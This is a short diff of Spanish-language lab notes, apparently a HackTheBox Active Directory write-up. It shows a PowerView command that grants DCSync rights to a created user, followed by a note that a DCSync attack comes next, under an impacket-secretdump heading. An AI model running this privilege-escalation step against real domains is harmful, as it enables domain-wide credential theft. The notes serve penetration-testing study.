@@ -160,5 +160,5 @@ con la primera linea seteamos los privilegios de DCSync al usuario que hemos cre
 ![[Pasted image 20240319002640.png]]
 
 ### impacket-secretdump
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity gamu -Rights DCSync
+`Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity gamu -Rights DCSync` agregamos el usuario al dominio y le damos permisos de DCSync luego ejecutamos un ataque DCSyn
 ![[Pasted image 20240319005053.png]]
